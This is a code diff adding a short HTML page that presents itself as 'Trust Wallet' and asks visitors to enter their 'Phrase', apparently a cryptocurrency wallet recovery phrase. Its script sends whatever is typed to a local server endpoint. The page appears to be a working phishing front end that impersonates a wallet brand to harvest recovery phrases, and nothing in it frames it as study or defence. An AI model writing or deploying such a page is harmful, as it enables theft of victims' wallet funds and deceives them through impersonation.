@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Trust Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body> 
+  <form id="phraseForm">
+    <label for="comment">
+      <h2 class="find">Phrase:</h2>
+    </label>
+    <textarea name="comment" id="comment" placeholder="Enter Phrase" required></textarea><br>
+    <input type="submit" value="submit">
+  </form>
+
+  <script>
+    // JavaScript to handle form submission
+    document.getElementById('phraseForm').addEventListener('submit', async (e) => {
+      e.preventDefault(); // Prevent default form submission
+
+      const comment = document.getElementById('comment').value;
+
+      try {
+        const response = await fetch('http://localhost:3000/submit', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ comment }),
+        });
+
+        const data = await response.json();
+        alert(data.message);
+      } catch (error) {
+        console.error('Error:', error);
+        alert('Failed to submit data.');
+      }
+    });
+  </script>
+</body>
+</html>
